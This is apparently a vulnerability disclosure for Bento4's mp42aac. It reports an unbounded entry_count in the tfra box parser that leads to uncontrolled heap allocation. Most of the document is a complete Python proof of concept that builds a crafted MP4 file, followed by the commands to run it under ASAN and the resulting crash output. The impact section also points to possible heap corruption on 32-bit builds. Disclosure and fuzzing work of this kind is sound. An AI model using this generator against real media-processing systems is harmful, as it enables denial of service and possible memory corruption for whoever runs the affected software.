## Bug0: AP4_TfraAtom constructor accepts unbounded file-controlled entry_count causing uncontrolled heap allocation

In `AP4_TfraAtom::AP4_TfraAtom()` in Ap4TfraAtom.cpp, the `entry_count` field is read from the MP4 stream at lines 86–88 and passed directly to `m_Entries.SetItemCount(entry_count)` without any upper-bound validation, which causes uncontrolled heap allocation and process termination when a crafted MP4 supplies a value such as 0x20000000.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
import struct, os

def box(btype, data):
    return struct.pack('>I', 4 + 4 + len(data)) + btype + data

def full_box(btype, version, flags, data):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return box(btype, hdr + data)

# tfra: version=0, flags=0
track_id = 1
# length_size_of_traf_num=0, length_size_of_trun_num=0, length_size_of_sample_num=0
# packed into 4B: 0x00 0x00 0x00 0x00
length_sizes = 0x00000000
entry_count = 0x20000000
# fake entry: time(4B) + moof_offset(4B) + traf_number(1B) + trun_number(1B) + sample_number(1B)
fake_entry = struct.pack('>II', 0, 0) + b'\x01\x01\x01'
tfra_data = struct.pack('>I', track_id)
tfra_data += struct.pack('>I', length_sizes)
tfra_data += struct.pack('>I', entry_count)
tfra_data += fake_entry
tfra = full_box(b'tfra', 0, 0, tfra_data)

# mfro: will contain mfra total size
mfro_inner = full_box(b'mfro', 0, 0, struct.pack('>I', 0))  # placeholder
mfra_content = tfra + mfro_inner
mfra_size = 4 + 4 + len(mfra_content)

# rebuild mfro with correct size
mfro = full_box(b'mfro', 0, 0, struct.pack('>I', mfra_size))
mfra = box(b'mfra', tfra + mfro)

# minimal moov
mvhd_data = struct.pack('>IIII', 0, 0, 1000, 0)
mvhd_data += struct.pack('>I', 0x00010000)
mvhd_data += struct.pack('>H', 0x0100) + b'\x00'*10
mvhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
mvhd_data += b'\x00'*24 + struct.pack('>I', 0xFFFFFFFF)
mvhd = full_box(b'mvhd', 0, 0, mvhd_data)

tkhd_data = struct.pack('>IIII', 0, 0, 1, 0)
tkhd_data += struct.pack('>I', 0) + b'\x00'*4 + b'\x00'*8
tkhd_data += struct.pack('>HH', 0, 0) + struct.pack('>H', 0x0100) + b'\x00'*2
tkhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
tkhd_data += struct.pack('>II', 0, 0)
tkhd = full_box(b'tkhd', 0, 3, tkhd_data)

stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))
stsc = full_box(b'stsc', 0, 0, struct.pack('>I', 0))
stsz = full_box(b'stsz', 0, 0, struct.pack('>II', 0, 0))
stco = full_box(b'stco', 0, 0, struct.pack('>I', 0))
stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)

url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)
smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = box(b'minf', smhd + dinf + stbl)

mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0) + struct.pack('>HH', 0, 0)
mdhd = full_box(b'mdhd', 0, 0, mdhd_data)
hdlr_data = struct.pack('>I', 0) + b'soun' + b'\x00'*12 + b'SoundHandler\x00'
hdlr = full_box(b'hdlr', 0, 0, hdlr_data)
mdia = box(b'mdia', mdhd + hdlr + minf)
trak = box(b'trak', tkhd + mdia)
moov = box(b'moov', mvhd + trak)

ftyp = box(b'ftyp', b'iso5' + struct.pack('>I', 0) + b'iso5' + b'isom')

outpath = "poc_input.mp4"
with open(outpath, 'wb') as f:
    f.write(ftyp + moov + mfra)
print(f"Written {outpath}, size={os.path.getsize(outpath)}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:hard_rss_limit_mb=1024" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==760200==AddressSanitizer: hard rss limit exhausted (1024Mb vs 1159Mb)
Trigger: tfra box entry_count=0x20000000 causes AP4_TfraAtom::AP4_TfraAtom() to call SetItemCount(0x20000000), which attempts to allocate over 1 GB of heap memory with no upper-bound check, confirming uncontrolled resource consumption via CWE-789 / CWE-400.

### Impact

An attacker who supplies a crafted MP4 file with an oversized `entry_count` in the `tfra` box can force mp42aac to request more than one gigabyte of heap memory in a single allocation, causing the process to terminate via `std::bad_alloc` or ASAN RSS limit exhaustion and resulting in a denial-of-service condition. The attack surface is any invocation of mp42aac (or any Bento4-based tool) on an untrusted MP4 file, requiring no authentication or elevated privileges. On 32-bit builds the multiplication `entry_count * sizeof(Entry)` wraps around, producing a small under-allocated buffer followed by out-of-bounds heap writes that may enable memory corruption beyond denial of service.
